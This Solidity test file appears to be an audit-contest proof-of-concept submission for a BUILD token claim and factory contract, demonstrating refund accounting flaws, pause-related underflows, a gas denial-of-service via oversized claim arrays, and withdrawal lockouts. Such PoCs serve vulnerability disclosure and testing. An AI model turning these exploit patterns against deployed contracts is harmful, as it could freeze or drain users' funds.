pragma solidity 0.8.26;

import {BaseTest} from "./BaseTest.t.sol";
import {IBUILDFactory} from "../src/interfaces/IBUILDFactory.sol";
import {BUILDClaim} from "../src/BUILDClaim.sol";
import {IBUILDClaim} from "../src/interfaces/IBUILDClaim.sol";

import {IAccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

import "forge-std/Test.sol";


contract DemoClaimExecutor {
    BUILDClaim public claimContract;

    BUILDClaim.ClaimParams[] public claimParams;

    constructor(address _claimContract) {
        claimContract = BUILDClaim(_claimContract);
    }

    function AutoClaim(address user, BUILDClaim.ClaimParams[] calldata params) external {
        // this call will consume massive gas or revert
      claimContract.claim(user, params);
    }
}


contract PoC is BaseTest {
  function test_submissionValidity() 
    external
    // Modifiers of BaseTest for setup
  {
    // Proof of Concept code demonstrating the vulnerability
  }

  function test_RefundAccountingBrokenByPostRefundClaims()
    external
    whenASeasonConfigIsSetForTheSeason
    whenProjectAddedAndClaimDeployed
    whenTokensAreDepositedForTheProject
    whenTheCallerIsFactoryAdmin
  {
    IBUILDFactory.ProjectSeasonConfig memory newConfig = IBUILDFactory.ProjectSeasonConfig({
      tokenAmount: 1000000,
      baseTokenClaimBps: BASE_TOKEN_CLAIM_PERCENTAGE_P1_S1,
      unlockDelay: 0,
      unlockDuration: 1,
      merkleRoot: 0x86f1184ba993ff0bb779d148498253824a3e8d9ac9457c53794d7c842d2a06e0,
      earlyVestRatioMinBps: EARLY_VEST_RATIO_MIN_P1_S2,
      earlyVestRatioMaxBps: EARLY_VEST_RATIO_MAX_P1_S2,
      isRefunding: false
    });
    IBUILDFactory.SetProjectSeasonParams[] memory params =
      new IBUILDFactory.SetProjectSeasonParams[](1);
    params[0] = IBUILDFactory.SetProjectSeasonParams({
      token: address(s_token),
      seasonId: SEASON_ID_S1,
      config: newConfig
    });
    // it should emit events: ProjectTotalAllocatedUpdated, ProjectSeasonConfigUpdated
    vm.expectEmit(address(s_factory));
    emit IBUILDFactory.ProjectTotalAllocatedUpdated(
      address(s_token), 0, params[0].config.tokenAmount
    );
    vm.expectEmit(address(s_factory));
    emit IBUILDFactory.ProjectSeasonConfigUpdated(address(s_token), SEASON_ID_S1, newConfig);
    s_factory.setProjectSeasonConfig(params);

    // it should set the project season config
    (IBUILDFactory.ProjectSeasonConfig memory latestConfig,) =
      s_factory.getProjectSeasonConfig(address(s_token), SEASON_ID_S1);

    assertEq(latestConfig.tokenAmount, params[0].config.tokenAmount);
    assertEq(latestConfig.baseTokenClaimBps, params[0].config.baseTokenClaimBps);
    // assertEq(latestConfig.unlockDelay, params[0].config.unlockDelay);
    // assertEq(latestConfig.unlockDuration, params[0].config.unlockDuration);
    assertEq(latestConfig.merkleRoot, params[0].config.merkleRoot);
    assertEq(latestConfig.isRefunding, false);

    vm.warp(block.timestamp + 86400);

    address user1 = address(0x111111);

    BUILDClaim.ClaimParams[] memory claimParams;
    claimParams = new BUILDClaim.ClaimParams[](1);

    bytes32 [] memory proof1 = new bytes32[](1);
    proof1[0] = 0x4c40e22fc4a2d4382ffce7805aa66bb9fe1188c9c9277cc9051450f5ec8d058b;

    claimParams[0] = IBUILDClaim.ClaimParams({
        seasonId: SEASON_ID_S1,
        proof: proof1,
        maxTokenAmount: 20000,
        salt: 0x0,
        isEarlyClaim: false
      });
    // user1 claim for the first time 
    s_claim.claim(user1, claimParams);

    // DEFAULT_ADMIN_ROLE call startRefund
    s_factory.startRefund(address(s_token), SEASON_ID_S1);

    // caculate availableAmount before user1 claim for the second time 
    uint256 availableAmountAfter1= s_factory.calcMaxAvailableAmount(address(s_token));
    console.log("availableAmountAfter1:", availableAmountAfter1);

    uint256 user1_balance = s_token.balanceOf(user1);
    console.log("user1_balance:", user1_balance);

    BUILDClaim.ClaimParams[] memory claimParams1;
    claimParams1 = new BUILDClaim.ClaimParams[](1);

    bytes32 [] memory proof2 = new bytes32[](1);
    proof2[0] = 0x981c53afa73a2af4065e6d1c29031b85b0674a1fa57a920978787ace54f11a68;

    claimParams1[0] = IBUILDClaim.ClaimParams({
        seasonId: SEASON_ID_S1,
        proof: proof2,
        maxTokenAmount: 30000,
        salt: 0x0,
        isEarlyClaim: false
      });

    // user1 claim for the second time
    s_claim.claim(user1, claimParams1);
    
    uint256 user1_balance1 = s_token.balanceOf(user1);
    console.log("user1_balance1:", user1_balance1);

    // user1 successfully claims again, and his balance increases
    assertGt(user1_balance1, user1_balance, "user1 balance should be greater than before");

    uint256 availableAmountAfter2= s_factory.calcMaxAvailableAmount(address(s_token));
    console.log("availableAmountAfter2:", availableAmountAfter2);

    // availableAmount remains unchange after user1 claims again
    assertEq(availableAmountAfter2, availableAmountAfter1, "availableAmount should be equal after user1 claims again");
  }

  function test_EmergencyPauseBypassesWithdrawalLimitAndBreaksAccounting()
    external
    whenASeasonConfigIsSetForTheSeason
    whenProjectAddedAndClaimDeployed
    whenTokensAreDepositedForTheProject
    whenTheCallerIsFactoryAdmin
  {
    IBUILDFactory.ProjectSeasonConfig memory newConfig = IBUILDFactory.ProjectSeasonConfig({
      tokenAmount: 100 ether,
      baseTokenClaimBps: BASE_TOKEN_CLAIM_PERCENTAGE_P1_S1,
      unlockDelay: UNLOCK_DELAY_P1_S1,
      unlockDuration: 1,
      merkleRoot: bytes32(0),
      earlyVestRatioMinBps: EARLY_VEST_RATIO_MIN_P1_S2,
      earlyVestRatioMaxBps: EARLY_VEST_RATIO_MAX_P1_S2,
      isRefunding: false
    });
    IBUILDFactory.SetProjectSeasonParams[] memory params =
      new IBUILDFactory.SetProjectSeasonParams[](1);
    params[0] = IBUILDFactory.SetProjectSeasonParams({
      token: address(s_token),
      seasonId: SEASON_ID_S1,
      config: newConfig
    });
    // it should emit events: ProjectTotalAllocatedUpdated, ProjectSeasonConfigUpdated
    vm.expectEmit(address(s_factory));
    emit IBUILDFactory.ProjectTotalAllocatedUpdated(
      address(s_token), 0, params[0].config.tokenAmount
    );
    vm.expectEmit(address(s_factory));
    emit IBUILDFactory.ProjectSeasonConfigUpdated(address(s_token), SEASON_ID_S1, newConfig);
    s_factory.setProjectSeasonConfig(params);

    // it should set the project season config
    (IBUILDFactory.ProjectSeasonConfig memory latestConfig,) =
      s_factory.getProjectSeasonConfig(address(s_token), SEASON_ID_S1);
    assertEq(latestConfig.tokenAmount, params[0].config.tokenAmount);
    assertEq(latestConfig.baseTokenClaimBps, params[0].config.baseTokenClaimBps);
    assertEq(latestConfig.unlockDelay, params[0].config.unlockDelay);
    assertEq(latestConfig.unlockDuration, params[0].config.unlockDuration);
    assertEq(latestConfig.merkleRoot, params[0].config.merkleRoot);
    assertEq(latestConfig.isRefunding, false);

    IBUILDFactory.TokenAmounts memory tokenAmountsNow = s_factory.getTokenAmounts(address(s_token));
    console.log("total deposit:",tokenAmountsNow.totalDeposited);
    console.log("totalAllocatedToAllSeasons:",tokenAmountsNow.totalAllocatedToAllSeasons);

    uint256 availableAmount= s_factory.calcMaxAvailableAmount(address(s_token));
    console.log("availableAmount:", availableAmount);
    
    // grant the admin role to the admin address
    s_factory.grantRole(s_factory.PAUSER_ROLE(), ADMIN);
    // pause the factory 
    s_factory.emergencyPause();

    // admin schedules a withdrawal
    s_factory.scheduleWithdraw(address(s_token), PROJECT_ADMIN, 400 ether);

    // project admin withdraws
    _changePrank(PROJECT_ADMIN);
    s_claim.withdraw();

    // admin unpauses the factory
    _changePrank(ADMIN);
    s_factory.emergencyUnpause();

    // arithmeticError in calcMaxAvailableAmount
    vm.expectRevert(stdError.arithmeticError);
    s_factory.calcMaxAvailableAmount(address(s_token));

    // arithmeticError in scheduleWithdraw
    vm.expectRevert(stdError.arithmeticError);
    s_factory.scheduleWithdraw(address(s_token), PROJECT_ADMIN, 1);

    // arithmeticError in setProjectSeasonConfig
    vm.expectRevert(stdError.arithmeticError);
    s_factory.setProjectSeasonConfig(params);

    // The core accounting formula (totalDeposited + totalRefunded - totalWithdrawn - totalAllocatedToAllSeasons) breaks down entirely, 
    // and the administrative capabilities of the factory contract become completely frozen.

  }

  function test_UnboundedClaimParamsCausesExecutorDoS() 
    external
    whenASeasonConfigIsSetForTheSeason
    whenProjectAddedAndClaimDeployed
    whenTokensAreDepositedForTheProject
    whenASeasonConfigIsSetForTheProject
    whenTheUnlockIsInHalfWayForSeason1
  {
    address ExecutorAdmin = makeAddr("ExecutorAdmin");

    _changePrank(ExecutorAdmin);
    DemoClaimExecutor executor = new DemoClaimExecutor(address(s_claim));

    // _changePrank(Attacker);
    // An attacker builds a large array of claim params, and has the executor call it

    IBUILDClaim.ClaimParams[] memory params = new IBUILDClaim.ClaimParams[](10000);

    for (uint256 i = 0; i < params.length; i++) {
      params[i] = IBUILDClaim.ClaimParams({
        seasonId: SEASON_ID_S1,
        proof: MERKLE_PROOF_P1_S1_U1,
        maxTokenAmount: MAX_TOKEN_AMOUNT_P1_S1_U1,
        salt: SALT_U1,
        isEarlyClaim: false
      });
    } 
      
    uint256 gas_used;
    uint256 before = gasleft();
    
    
    try executor.AutoClaim{gas:1000000}(USER_1, params){
      // AutoClaim fails because of the large number of params
      assert(false);
    } catch {
        gas_used = before - gasleft();
    }

    // the DemoClaimExecutor should consume a lot of gas or revert
    assertGt(gas_used, 1000000, "Gas used should be more than 100000");

    console.log("Gas used:", gas_used);

    
  }

  function test_ReDeployClaimBreaksOriginalClaimWithdraw()     
    external
    whenASeasonConfigIsSetForTheSeason
    whenProjectAddedAndClaimDeployed
    whenDepositedAndWithdrawalScheduled
  {
    
    address[] memory tokens = new address[](1);
    tokens[0] = address(s_token);
    s_factory.removeProjects(tokens);

    _changePrank(PROJECT_ADMIN);

    // it should revert due to the```s_projects[token]``` is deleted
    vm.expectRevert(
      abi.encodeWithSelector(IAccessControl.AccessControlUnauthorizedAccount.selector, PROJECT_ADMIN, keccak256("PROJECT_ADMIN"))
    );
    s_claim.withdraw();

  }

  function test_FundsPermanentlyLockedOnAdminLoss ()     
    external
    whenASeasonConfigIsSetForTheSeason
    whenProjectAddedAndClaimDeployed
    whenTheCallerIsProjectAdmin
  {
    // 	The admin wallet controlling the factory is lost or compromised. No one can call factory.scheduleWithdraw()

    // it should revert
    vm.expectRevert(
      abi.encodeWithSelector(IBUILDFactory.WithdrawalDoesNotExist.selector, address(s_token))
    );
    s_claim.withdraw();

  }
  modifier whenDepositedAndWithdrawalScheduled() {
    _changePrank(PROJECT_ADMIN);
    s_token.approve(address(s_claim), 10);
    s_claim.deposit(10);

    _changePrank(ADMIN);
    s_factory.scheduleWithdraw(address(s_token), PROJECT_ADMIN, 10);
    _;
  }

  modifier whenTheCallerIsProjectAdmin() {
    _changePrank(PROJECT_ADMIN);
    _;
  }

  modifier whenTheCallerIsFactoryAdmin() {
    assertEq(s_factory.hasRole(s_factory.DEFAULT_ADMIN_ROLE(), ADMIN), true);
    _changePrank(ADMIN);
    _;
  }
}
